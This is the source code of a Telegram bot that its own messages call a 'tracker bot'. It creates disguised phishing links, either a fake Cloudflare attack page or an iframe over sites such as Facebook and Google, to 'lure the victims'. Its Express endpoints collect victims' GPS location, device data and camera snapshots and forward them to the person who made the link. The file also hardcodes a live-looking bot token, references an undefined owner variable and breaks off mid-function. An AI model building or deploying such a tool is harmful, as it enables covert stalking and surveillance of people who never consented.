const fs = require("fs");
const sqlite3 = require('sqlite3').verbose();
const express = require("express");
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const botOwnerId = 1249726999;

// Directly adding the token to the code
const botToken = '6104998193:AAE3w2GAh4QiKTWFsd0sozc_0ilCHsFNnzQ';

// Create a bot that uses 'polling' to fetch new updates
const bot = new TelegramBot(botToken, { polling: true });
const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' }));
app.use(bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' }));
app.set("view engine", "ejs");

// Modify your URL here
var hostURL = "https://gen.djdjkdsk.repl.co";
// TOGGLE for Shorters
var use1pt = false;

// Create or connect to SQLite database
const db = new sqlite3.Database('bot_database.db');

// Create the users table if it doesn't exist
db.run(`
    CREATE TABLE IF NOT EXISTS users (
        chat_id INTEGER PRIMARY KEY,
        subscribed INTEGER,
        name TEXT,
        username TEXT
    )
`);

// Function to check if the user has joined the channel
async function checkChannelMembership(chatId) {
  try {
    const member = await bot.getChatMember("@SG_Modder1", chatId); // Replace "@SG_Modder1" with your channel's username
    return member.status === "member" || member.status === "administrator" || member.status === "creator";
  } catch (error) {
    console.error("Error checking channel membership:", error);
    return false;
  }
}

// Mock database (replace this with actual usage)
let userDatabase = new Map(); // Key: user ID, Value: object containing details
let adminDatabase = new Set(); // Store admin user IDs

// Load user data from SQLite database on bot startup
db.all('SELECT * FROM users', (error, rows) => {
    if (error) {
        console.error('Error loading user data from database:', error);
        return;
    }

    rows.forEach(row => {
        userDatabase.set(row.chat_id, {
            subscribed: row.subscribed,
            name: row.name,
            username: row.username,
        });
    });
});

// Command to start the subscription
bot.onText(/\/start|\/create/, (msg) => {
    const chatId = msg.chat.id;
    if (!userDatabase.has(chatId)) {
        userDatabase.set(chatId, {
            subscribed: true,
            name: msg.from.first_name,
            username: msg.from.username,
        });

        // Save the user's chat ID in the SQLite database
        db.run(
            'INSERT OR REPLACE INTO users (chat_id, subscribed, name, username) VALUES (?, ?, ?, ?)',
            [chatId, 1, msg.from.first_name, msg.from.username],
            error => {
                if (error) {
                    console.error('Error saving user data:', error);
                }
            }
        );
    }
});

// Command to start the broadcasting process
bot.onText(/\/startbroadcast/, (msg) => {
    const chatId = msg.chat.id;

    if (adminDatabase.has(chatId.toString()) || chatId.toString() === ownerChatId) {
        bot.sendMessage(chatId, "Please send the broadcast message, or a photo, video, document, or any content:");
        bot.once('message', (adminMsg) => {
            if (adminMsg.text && adminMsg.text !== '/startbroadcast') {
                const numberOfUsers = broadcastToAll(adminMsg);
                bot.sendMessage(chatId, `Broadcast sent to ${numberOfUsers} users.`);
            } else {
                bot.sendMessage(chatId, "Broadcast not sent. Please provide a valid message.");
            }
        });
    }
});

// Command to list users' details
bot.onText(/\/list/, (msg) => {
    const chatId = msg.chat.id;

    if (adminDatabase.has(chatId.toString()) || chatId.toString() === ownerChatId) {
        listUsersDetails(chatId);
    }
});

// Command to get bot status
bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;

    if (adminDatabase.has(chatId.toString()) || chatId.toString() === ownerChatId) {
        getBotStatus(chatId);
    }
});

// Command to make a user an admin
bot.onText(/\/makeadmin (.+)/, (msg, match) => {
    const chatId = msg.chat.id;

    if (chatId.toString() === ownerChatId) {
        const targetUsername = match[1];
        const targetUser = getUserByUsername(targetUsername);

        if (targetUser) {
            adminDatabase.add(targetUser.id.toString());
            bot.sendMessage(chatId, `User ${targetUser.first_name} (@${targetUser.username}) is now an admin.`);
        } else {
            bot.sendMessage(chatId, "User not found.");
        }
    }
});

// Command to remove admin privileges from a user
bot.onText(/\/removeadmin (.+)/, (msg, match) => {
    const chatId = msg.chat.id;

    if (chatId.toString() === ownerChatId) {
        const targetUsername = match[1];
        const targetUser = getUserByUsername(targetUsername);

        if (targetUser) {
            adminDatabase.delete(targetUser.id.toString());
            bot.sendMessage(chatId, `Admin privileges removed from the user ${targetUser.first_name} (@${targetUser.username}).`);
        } else {
            bot.sendMessage(chatId, "User not found.");
        }
    }
});

// Broadcast function for any type of content
function broadcastToAll(content) {
    let numberOfUsers = 0;
    userDatabase.forEach((details, user) => {
        if (details.subscribed) {
            numberOfUsers++;
            // Forward any type of message or content
            if (content.text) {
                bot.sendMessage(user, content.text);
            } else if (content.photo) {
                const photoId = content.photo[0].file_id;
                bot.sendPhoto(user, photoId);
            } else if (content.video) {
                const videoId = content.video.file_id;
                bot.sendVideo(user, videoId);
            } else if (content.document) {
                const documentId = content.document.file_id;
                bot.sendDocument(user, documentId);
            }
        }
    });
    return numberOfUsers;
}

// Command to start the subscription
bot.onText(/\/start|\/create/, (msg) => {
    const chatId = msg.chat.id;
    if (!userDatabase.has(chatId)) {
        userDatabase.set(chatId, {
            subscribed: true,
            name: msg.from.first_name,
            username: msg.from.username,
        });
    }
});

// List users' details
function listUsersDetails(adminChatId) {
    let detailsList = "Users Details:\n\n";
    userDatabase.forEach((details, user) => {
        detailsList += `Name: ${details.name}\nUsername: ${details.username}\nChat ID: ${user}\n\n`;
    });

    if (detailsList !== "Users Details:\n\n") {
        fs.writeFileSync('users_details.txt', detailsList, 'utf-8');
        bot.sendDocument(adminChatId, 'users_details.txt');
    } else {
        bot.sendMessage(adminChatId, "No user details to list.");
    }
}

// Get bot status
function getBotStatus(adminChatId) {
    const totalAdmins = adminDatabase.size;
    const totalUsers = userDatabase.size;
    const totalBroadcasts = 0; // Implement your logic to track broadcasts

    const statusMessage = `
Bot Status:

Owners: ${getOwnerDetails()}
Total Admins: ${totalAdmins}
Total Users: ${totalUsers}
Total Broadcasts: ${totalBroadcasts}
`;

    bot.sendMessage(adminChatId, statusMessage);
}

// Get owner details
function getOwnerDetails() {
    const owner = userDatabase.get(parseInt(ownerChatId));
    return `${owner.name} (@${owner.username})`;
}

// Get a user by their username
function getUserByUsername(username) {
    for (let [userId, details] of userDatabase.entries()) {
        if (details.username === username) {
            return {
                id: userId,
                first_name: details.name,
                username: details.username,
            };
        }
    }
    return null;
}

// Start listening for user interactions
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const message = msg.text.toLowerCase();

    if (message.includes('unsubscribe')) {
        userDatabase.delete(chatId);
    }
});

app.get("/w/:path/:uri", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace('T', ':');
  if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }

  if (req.params.path != null) {
    res.render("webview", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
  }
  else {
    res.redirect("https://t.me/SG_Modder1");
  }
});

app.get("/c/:path/:uri", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace('T', ':');
  if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }

  if (req.params.path != null) {
    res.render("cloudflare", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
  }
  else {
    res.redirect("https://t.me/SG_Modder1");
  }
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg?.reply_to_message?.text == "🔗 𝑬𝒏𝒕𝒆𝒓 𝒀𝒐𝒖𝒓 𝑼𝑹𝑳 🔗") {
    const isMember = await checkChannelMembership(chatId);
    if (!isMember) {
      const joinButton = {
        text: "Join Channel",
        url: "https://t.me/SG_Modder1"
      };
      const m = {
        reply_markup: JSON.stringify({ "inline_keyboard": [[joinButton]] })
      };
      bot.sendMessage(chatId, "🚨 **Attention!** 🚨\n\n🚀 𝗬𝗼𝘂 𝗺𝘂𝘀𝘁 𝗷𝗼𝗶𝗻 𝘁𝗵𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗯𝗲𝗳𝗼𝗿𝗲 𝘂𝘀𝗶𝗻𝗴 𝗼𝘁𝗵𝗲𝗿 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀. 🌟\n\n🔌 𝗧𝗼 𝗷𝗼𝗶𝗻, 𝗽𝗹𝗲𝗮𝘀𝗲 𝗳𝗼𝗹𝗹𝗼𝘄 𝘁𝗵𝗲𝘀𝗲 𝘀𝘁𝗲𝗽𝘀: 🔌\n\n1. Click on theJoin Channel button below. 📲🔗\n2. After joining the channel, feel free to try other commands. 🚀📝\n3. If you have any questions, don't hesitate to ask. We're here to help! 💬🤗\n\n✨ 𝗝𝗼𝗶𝗻 𝘁𝗵𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗳𝗼𝗿 𝗲𝘅𝗰𝗹𝘂𝘀𝗶𝘃𝗲 𝘂𝗽𝗱𝗮𝘁𝗲𝘀. 𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂! 🌈🎉.", m);
      return;
    }
    createLink(chatId, msg.text);
  } else if (msg.text == "/generateLink") { // Add this condition for generating link button
    generateLinkButton(chatId);
  }

  if (msg.text == "/start") {
    const userName = msg.chat.first_name;
    const m = {
      reply_markup: JSON.stringify({ "inline_keyboard": [
        [{ text: "🌐 𝐂𝐫𝐞𝐚𝐭𝐞 𝐋𝐢𝐧𝐤 🌐", callback_data: "crenew" }],
        [{ text: "🔗 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐋𝐢𝐧𝐤 🔗", callback_data: "generateLink" }],
        [{ text: "📡 𝐉𝐨𝐢𝐧 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 📡", url: "https://t.me/SG_Modder1" }]
      ]})
    };

    const welcomeMessage = `𝗛𝗲𝗹𝗹𝗼 ${userName}! 🌟 \n\n𝗜 𝗮𝗺 𝗮𝗻 🅐🅘 𝘁𝗿𝗮𝗰𝗸𝗲𝗿 𝗯𝗼𝘁 𝗺𝗮𝗱𝗲 𝗯𝘆 @SG_Modder. 🤖\n\n🔍 𝗬𝗼𝘂 𝗰𝗮𝗻 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁 𝘁𝗼 𝘁𝗿𝗮𝗰𝗸 𝗽𝗲𝗼𝗽𝗹𝗲 𝗯𝘆 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝘁𝗵𝗲𝗺 𝗮 𝘀𝗶𝗺𝗽𝗹𝗲 𝗹𝗶𝗻𝗸. \n\n𝗜𝘁 𝗰𝗮𝗻 𝗰𝗼𝗹𝗹𝗲𝗰𝘁 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗹𝗶𝗸𝗲 \n➊  𝙏𝙧𝙖𝙘𝙠 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣📍\n➋ 𝘿𝙚𝙫𝙞𝙘𝙚 𝘿𝙚𝙩𝙖𝙞𝙡𝙨📱\n➌ 𝘾𝙖𝙢𝙚𝙧𝙖 𝙎𝙣𝙖𝙥𝙨𝙝𝙤𝙩𝙨 📸.\n\n𝗧𝘆𝗽𝗲 /help 𝗳𝗼𝗿 𝗺𝗼𝗿𝗲 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 🆘.`;


    bot.sendMessage(chatId, welcomeMessage, m);
  } else if (msg.text == "/create") {
    const isMember = await checkChannelMembership(chatId);
    if (!isMember) {
      const joinButton = {
        text: "Join Channel",
        url: "https://t.me/SG_Modder1"
      };
      const m = {
        reply_markup: JSON.stringify({ "inline_keyboard": [[joinButton]] })
      };
      bot.sendMessage(chatId, "🚨 **Attention!** 🚨\n\n🚀 𝗬𝗼𝘂 𝗺𝘂𝘀𝘁 𝗷𝗼𝗶𝗻 𝘁𝗵𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗯𝗲𝗳𝗼𝗿𝗲 𝘂𝘀𝗶𝗻𝗴 𝗼𝘁𝗵𝗲𝗿 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀. 🌟\n\n🔌 𝗧𝗼 𝗷𝗼𝗶𝗻, 𝗽𝗹𝗲𝗮𝘀𝗲 𝗳𝗼𝗹𝗹𝗼𝘄 𝘁𝗵𝗲𝘀𝗲 𝘀𝘁𝗲𝗽𝘀: 🔌\n\n1. Click on theJoin Channel button below. 📲🔗\n2. After joining the channel, feel free to try other commands. 🚀📝\n3. If you have any questions, don't hesitate to ask. We're here to help! 💬🤗\n\n✨ 𝗝𝗼𝗶𝗻 𝘁𝗵𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗳𝗼𝗿 𝗲𝘅𝗰𝗹𝘂𝘀𝗶𝘃𝗲 𝘂𝗽𝗱𝗮𝘁𝗲𝘀. 𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂! 🌈🎉.", m);
      return;
    }
    createNew(chatId);
  } else if (msg.text == "/help") {
    const isMember = await checkChannelMembership(chatId);
    if (!isMember) {
      const joinButton = {
        text: "Join Channel",
        url: "https://t.me/SG_Modder1"
      };
      const m = {
        reply_markup: JSON.stringify({ "inline_keyboard": [[joinButton]] })
      };
      bot.sendMessage(chatId, "🚨 **Attention!** 🚨\n\n🚀 𝗬𝗼𝘂 𝗺𝘂𝘀𝘁 𝗷𝗼𝗶𝗻 𝘁𝗵𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗯𝗲𝗳𝗼𝗿𝗲 𝘂𝘀𝗶𝗻𝗴 𝗼𝘁𝗵𝗲𝗿 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀. 🌟\n\n🔌 𝗧𝗼 𝗷𝗼𝗶𝗻, 𝗽𝗹𝗲𝗮𝘀𝗲 𝗳𝗼𝗹𝗹𝗼𝘄 𝘁𝗵𝗲𝘀𝗲 𝘀𝘁𝗲𝗽𝘀: 🔌\n\n1. Click on theJoin Channel button below. 📲🔗\n2. After joining the channel, feel free to try other commands. 🚀📝\n3. If you have any questions, don't hesitate to ask. We're here to help! 💬🤗\n\n✨ 𝗝𝗼𝗶𝗻 𝘁𝗵𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗳𝗼𝗿 𝗲𝘅𝗰𝗹𝘂𝘀𝗶𝘃𝗲 𝘂𝗽𝗱𝗮𝘁𝗲𝘀. 𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂! 🌈🎉.", m);
      return;
    }
    bot.sendMessage(chatId, `🕵️‍♂️🌐𝗧𝗵𝗿𝗼𝘂𝗴𝗵 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁, 𝘆𝗼𝘂 𝗰𝗮𝗻 𝘁𝗿𝗮𝗰𝗸 𝗽𝗲𝗼𝗽𝗹𝗲 𝗯𝘆 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 /create.\n\n📝 𝗔𝗳𝘁𝗲𝗿 𝘁𝗵𝗮𝘁, 𝘆𝗼𝘂'𝗹𝗹 𝗯𝗲 𝗮𝘀𝗸𝗲𝗱 𝗳𝗼𝗿 𝘁𝗵𝗲 𝗨𝗥𝗟 𝘁𝗵𝗮𝘁 𝘄𝗶𝗹𝗹 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗶𝗻 𝘁𝗵𝗲 𝗶𝗳𝗿𝗮𝗺𝗲 𝘁𝗼 𝗹𝘂𝗿𝗲 𝘁𝗵𝗲 𝘃𝗶𝗰𝘁𝗶𝗺𝘀.\n\n🔒 𝗦𝗽𝗲𝗰𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻𝘀:
1. 𝗖𝗹𝗼𝘂𝗱𝗳𝗹𝗮𝗿𝗲 𝗟𝗶𝗻𝗸: 𝗧𝗵𝗶𝘀 𝗺𝗲𝘁𝗵𝗼𝗱 𝘄𝗶𝗹𝗹 𝘀𝗵𝗼𝘄 𝗮 𝗰𝗹𝗼𝘂𝗱𝗳𝗹𝗮𝗿𝗲 𝗽𝗮𝗴𝗲 𝘂𝗻𝗱𝗲𝗿 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗼 𝗰𝗼𝗹𝗹𝗲𝗰𝘁 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗮𝗻𝗱 𝗿𝗲𝗱𝗶𝗿𝗲𝗰𝘁 𝘁𝗵𝗲 𝘃𝗶𝗰𝘁𝗶𝗺 𝘁𝗼 𝘁𝗵𝗲 𝗶𝗻𝘁𝗲𝗻𝗱𝗲𝗱 𝗨𝗥𝗟.
2. 𝗪𝗲𝗯𝘃𝗶𝗲𝘄 𝗟𝗶𝗻𝗸: 𝗧𝗵𝗶𝘀 𝘄𝗶𝗹𝗹 𝗱𝗶𝘀𝗽𝗹𝗮𝘆 𝗮 𝘄𝗲𝗯𝘀𝗶𝘁𝗲 𝘂𝘀𝗶𝗻𝗴 𝗶𝗳𝗿𝗮𝗺𝗲 𝘁𝗼 𝗰𝗼𝗹𝗹𝗲𝗰𝘁 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻.\n\n📝 𝗡𝗼𝘁𝗲: 𝗠𝗮𝗻𝘆 𝘀𝗶𝘁𝗲𝘀 𝗺𝗮𝘆 𝗻𝗼𝘁 𝘄𝗼𝗿𝗸 𝘂𝗻𝗱𝗲𝗿 𝘁𝗵𝗶𝘀 𝗺𝗲𝘁𝗵𝗼𝗱 𝗶𝗳 𝘁𝗵𝗲𝘆 𝗵𝗮𝘃𝗲 𝘅-𝗳𝗿𝗮𝗺𝗲 𝗼𝗽𝘁𝗶𝗼𝗻𝘀 𝘀𝗲𝘁. 𝗙𝗼𝗿 𝗲𝘅𝗮𝗺𝗽𝗹𝗲, 𝗵𝘁𝘁𝗽𝘀://𝗴𝗼𝗼𝗴𝗹𝗲.𝗰𝗼𝗺.\n\n🔍 𝗘𝗻𝗷𝗼𝘆 𝘁𝗿𝗮𝗰𝗸𝗶𝗻𝗴! 🕵️‍♂️🔍`);
  } // New command: /tutorial
  else if (msg.text == "/tutorial") {
  const tutorialVideo = 'https://t.me/SG_Modder1/4398'; // Replace 'example.com/tutorial.mp4' with your tutorial video link
  bot.sendVideo(chatId, tutorialVideo);
}
 
  // New command: /talk
  else if (msg.text == "/talk") {
    const yourUsername = 'SG_Modder'; // Replace 'your_username' with your actual Telegram username
    const chatLink = `https://t.me/${yourUsername}`;
    const ownerText = 'Have questions or want to talk to the owner? Click the button below:';
    const ownerButton = {
      text: 'Chat with Owner',
      url: chatLink
    };
    const m = {
      reply_markup: JSON.stringify({ inline_keyboard: [[ownerButton]] })
    };
    bot.sendMessage(chatId, ownerText, m);
  }
  // New command: /support
  else if (msg.text == "/support") {
    const groupLink = 'https://t.me/SGModder1'; // Replace 'your_group_link' with your actual group link
    const supportText = 'Need support or have any questions? Join our support group by clicking the button below:';
    const supportButton = {
      text: 'Join Support Group',
      url: groupLink
    };
    const m = {
      reply_markup: JSON.stringify({ inline_keyboard: [[supportButton]] })
    };
    bot.sendMessage(chatId, supportText, m);
  }
});

bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
  const cid = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (data == "crenew") {
    const isMember = await checkChannelMembership(cid);
    if (!isMember) {
      const joinButton = {
        text: "Join Channel",
        url: "https://t.me/SG_Modder1"
      };
      const m = {
        reply_markup: JSON.stringify({ "inline_keyboard": [[joinButton]] })
      };
      bot.sendMessage(cid, "🚨 **Attention!** 🚨\n\n🚀 𝗬𝗼𝘂 𝗺𝘂𝘀𝘁 𝗷𝗼𝗶𝗻 𝘁𝗵𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗯𝗲𝗳𝗼𝗿𝗲 𝘂𝘀𝗶𝗻𝗴 𝗼𝘁𝗵𝗲𝗿 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀. 🌟\n\n🔌 𝗧𝗼 𝗷𝗼𝗶𝗻, 𝗽𝗹𝗲𝗮𝘀𝗲 𝗳𝗼𝗹𝗹𝗼𝘄 𝘁𝗵𝗲𝘀𝗲 𝘀𝘁𝗲𝗽𝘀: 🔌\n\n1. Click on theJoin Channel button below. 📲🔗\n2. After joining the channel, feel free to try other commands. 🚀📝\n3. If you have any questions, don't hesitate to ask. We're here to help! 💬🤗\n\n✨ 𝗝𝗼𝗶𝗻 𝘁𝗵𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗳𝗼𝗿 𝗲𝘅𝗰𝗹𝘂𝘀𝗶𝘃𝗲 𝘂𝗽𝗱𝗮𝘁𝗲𝘀. 𝗧𝗵𝗮𝗻𝗸 ??𝗼𝘂! 🌈🎉.", m);
      return;
    }
    createNew(cid);
  } else if (data == "generateLink") {
    generateLinkButton(cid);
  } else if (data.startsWith("gen_")) {
    const siteUrl = data.substring(4);
    createLink(cid, siteUrl);
  }
});

async function createLink(cid, msg) {
  const encoded = [...msg].some(char => char.charCodeAt(0) > 127);

  if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {
    const url = `${cid.toString(36)}/${btoa(msg)}`;
    const cUrl = `${hostURL}/c/${url}`;
    const wUrl = `${hostURL}/w/${url}`;

    bot.sendChatAction(cid, "typing");

    try {
      const smolUrlResponse = await fetch('https://smolurl.com/api/links', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ url: cUrl })
      }).then(res => res.json());

      const isgdResponse = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(cUrl)}`).then(res => res.json());
      const smolUrlResponse2 = await fetch('https://smolurl.com/api/links', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ url: wUrl })
      }).then(res => res.json());

      const isgdResponse2 = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(wUrl)}`).then(res => res.json());

      const f = `\n➊ ${smolUrlResponse.data.short_url}\n➋ ${isgdResponse.shorturl}`;
      const g = `\n➊ ${smolUrlResponse2.data.short_url}\n➋ ${isgdResponse2.shorturl}`;

      const newLinksMessage = `🔗 𝗡𝗲𝘄 𝗟𝗶𝗻𝗸 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆.\n\n𝐔𝐑𝐋 ☛ ${msg}\n\n☁️ 𝐂𝐥𝐨𝐮𝐝𝐟𝐥𝐚𝐫𝐞 𝐏𝐚𝐠𝐞 𝐋𝐢𝐧𝐤𝐬👇${f}\n\n🌐 𝐖𝐞𝐛𝐕𝐢𝐞𝐰 𝐏𝐚𝐠𝐞 𝐋𝐢𝐧𝐤𝐬👇${g}`;
      const replyMarkup = {
        reply_markup: JSON.stringify({
          "inline_keyboard": [
            [{ text: "🔗 𝐂𝐫𝐞𝐚𝐭𝐞 𝐍𝐞𝐰 𝐋𝐢𝐧𝐤 🔗", callback_data: "crenew" }],
            [{ text: "🌟 𝑮𝒆𝒏𝒆𝒓𝒂𝒕𝒆 𝑵𝒆𝒘 𝑳𝒊𝒏𝒌 🌟", callback_data: "generateLink" }]
          ]
        })
      };
      bot.sendMessage(cid, newLinksMessage, replyMarkup);
    } catch (error) {
      console.error("Error creating short links:", error);
      bot.sendMessage(cid, "⚠️ 𝐀𝐧 𝐞𝐫𝐫𝐨𝐫 𝐨𝐜𝐜𝐮𝐫𝐫𝐞𝐝 𝐰𝐡𝐢𝐥𝐞 𝐜𝐫𝐞𝐚𝐭𝐢𝐧𝐠 𝐬𝐡𝐨𝐫𝐭 𝐥𝐢𝐧𝐤𝐬. ⚠️\n\n𝘗𝘭𝘦𝘢𝘴𝘦 𝘤𝘩𝘦𝘤𝘬 𝘵𝘩𝘦 𝘶𝘙𝘓 𝘪𝘯𝘱𝘶𝘵 𝘢𝘯𝘥 𝘵𝘳𝘺 𝘢𝘨𝘢𝘪𝘯. 🔄🔍🔗");
    }
  } else {
    bot.sendMessage(cid, `🌐 𝑷𝒍𝒆𝒂𝒔𝒆 𝑬𝒏𝒕𝒆𝒓 𝒂 𝒗𝒂𝒍𝒊𝒅 𝑼𝑹𝑳, 𝒊𝒏𝒄𝒍𝒖𝒅𝒊𝒏𝒈 𝒉𝒕𝒕𝒑 𝒐𝒓 𝒉𝒕𝒕𝒑𝒔. 🌐 \n\n𝗟𝗶𝗸𝗲 ➡️https://www.google.com/ `);
    createNew(cid);
  }
}

async function createNew(cid) {
  const replyMarkup = {
    reply_markup: JSON.stringify({ "force_reply": true })
  };
  bot.sendMessage(cid, `🔗 𝑬𝒏𝒕𝒆𝒓 𝒀𝒐𝒖𝒓 𝑼𝑹𝑳 🔗`, replyMarkup);
}

// New function: generateLinkButton
async function generateLinkButton(cid) {
  const isMember = await checkChannelMembership(cid);
  if (!isMember) {
    const joinButton = {
      text: "Join Channel",
      url: "https://t.me/SG_Modder1" // Replace with your channel's URL
    };
    const replyMarkup = {
      reply_markup: JSON.stringify({ "inline_keyboard": [[joinButton]] })
    };
    const joinMessage = `🚨 **Attention!** 🚨\n\n🚀 𝗬𝗼𝘂 𝗺𝘂𝘀𝘁 𝗷𝗼𝗶𝗻 𝘁𝗵𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗯𝗲𝗳𝗼𝗿𝗲 𝘂𝘀𝗶𝗻𝗴 𝗼𝘁𝗵𝗲𝗿 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀. 🌟\n\n` +
                        `🔌 𝗧𝗼 𝗷𝗼𝗶𝗻, 𝗽𝗹𝗲𝗮𝘀𝗲 𝗳𝗼𝗹𝗹𝗼𝘄 𝘁𝗵𝗲𝘀𝗲 𝘀𝘁𝗲𝗽𝘀: 🔌\n\n` +
                        `1. Click on the "Join Channel" button below. 📲🔗\n` +
                        `2. After joining the channel, feel free to try other commands. 🚀📝\n` +
                        `3. If you have any questions, don't hesitate to ask. We're here to help! 💬🤗\n\n` +
                        `✨ 𝗝𝗼𝗶𝗻 𝘁𝗵𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗳𝗼𝗿 𝗲𝘅𝗰𝗹𝘂𝘀𝗶𝘃𝗲 𝘂𝗽𝗱𝗮𝘁𝗲𝘀. 𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂! 🌈🎉`;

    bot.sendMessage(cid, joinMessage, { ...replyMarkup, parse_mode: "HTML" });
    return;
  }
  const socialMediaSites = [
    { name: "📱𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤📘", url: "https://facebook.com" },
    { name: "🐦𝐓𝐰𝐢𝐭𝐭𝐞𝐫🐤", url: "https://twitter.com" },
    { name: "📷𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦📸", url: "https://instagram.com" },
    { name: "⚡𝐘𝐨𝐮𝐭𝐮𝐛𝐞⚡", url: "https://youtube.com" },
    { name: "🔮Ｇｏｏｇｌｅ🔮", url: "https://google.com" },
    { name: "📝Ｃｈａｔ-ＧＰＴ💬", url: "http://sgchatgpt.zapier.app/" },
    // Add more social media sites as needed
  ];

  const generateButtonList = socialMediaSites.map(site => [{ text: site.name, callback_data: `gen_${site.url}` }]);
  
  // Sending the link buttons
  const m = {
    reply_markup: JSON.stringify({ inline_keyboard: generateButtonList })
  };
  bot.sendMessage(cid, "🌐 Select a social media site to generate a link:", m);
}

async function checkChannelMembership(chatId) {
  try {
    const member = await bot.getChatMember("@SG_Modder1", chatId); // Replace "@SG_Modder1" with your channel's username
    return member.status === "member" || member.status === "administrator" || member.status === "creator";
  } catch (error) {
    console.error("Error checking channel membership:", error);
    return false;
  }
}

bot.onText(/\/generateNewLink/, (msg) => {
  const chatId = msg.chat.id;
  generateLinkButton(chatId);
});


app.get("/", (req, res) => {
  var ip;
  if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }
  res.json({ "ip": ip });
});

app.post("/location", (req, res) => {
  var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  var uid = decodeURIComponent(req.body.uid) || null;
  var acc = decodeURIComponent(req.body.acc) || null;
  if (lon != null && lat != null && uid != null && acc != null) {
    bot.sendLocation(parseInt(uid, 36), lat, lon);
    bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
    res.send("Done");
  }
});

app.post("/", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var data = decodeURIComponent(req.body.data) || null;
  if (uid != null && data != null) {
    data = data.replaceAll("<br>", "\n");
    bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });
    res.send("Done");
  }
});

app.post("/camsnap", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var img = decodeURIComponent(req.body.img) || null;

  if (uid != null && img != null) {
    var buffer = Buffer.from(img, 'base64');
    var info = {
      filename: "camsnap.png",
      contentType: 'image/png'
    };

    try {
      bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
    } catch (error) {
      console.error("Error sending cam snap:", error);
    }

    res.send("Done");
  }
});

// Example usage
bot.on('polling_error', (error) => {
    console.error(error);
});

// Broadcast function for any type of content
function broadcastToAll(content) {
    let numberOfUsers = 0;
    userDatabase.forEach((details, user) => {
        if (details.subscribed) {
            numberOfUsers++;
